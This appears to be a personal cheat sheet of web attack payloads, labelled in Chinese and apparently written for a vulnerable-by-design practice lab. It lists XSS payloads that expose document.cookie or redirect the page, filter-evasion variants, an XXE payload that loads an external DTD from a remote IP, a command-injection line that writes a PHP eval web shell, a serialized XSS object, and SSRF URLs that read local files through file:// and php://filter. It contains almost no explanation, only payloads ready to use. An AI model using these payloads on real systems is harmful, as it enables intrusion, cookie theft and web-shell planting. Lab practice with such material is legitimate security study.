

xss-post:
<script>alert(document.cookie)</script>



<script>alert(document.cookie)</script>

<script type="text/javascript">window.location.href="跳转的目的地址";</script>
<script type="text/javascript">window.location.replace("跳转的目的地址");</script>
<script type="text/javascript">window.location.assign("跳转的目的地址");</script>

xxe:

```
<?xml version = "1.0"?>  
<!DOCTYPE ANY[  
<!ENTITY % dtd SYSTEM "http://192.168.163.177:90/XXE/vil.dtd">  
%dtd;]>

```
xss-过滤：
<SCript>alert(123)</SCRipt>
xss-htmlspecialchars:
javascript:alert(1)
xss-href输出:
javascript:alert(1)
xss-js:
'</script><script>alert(1)</script>
</script><script>alert(123)</script>

rce:
`127.0.0.1 | echo "<?php @eval(\$_REQUEST[123])?>" > shell.php`
php反序列化
O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}

SSRF:
```
http://localhost/pika/vul/ssrf/ssrf_fgc.php?file=file:///C://Users//86188//Desktop//tool//1.txt
http://localhost/pika/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=C://Users//86188//Desktop//tool//1.txt
http://localhost/pika/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf_fgc.php
```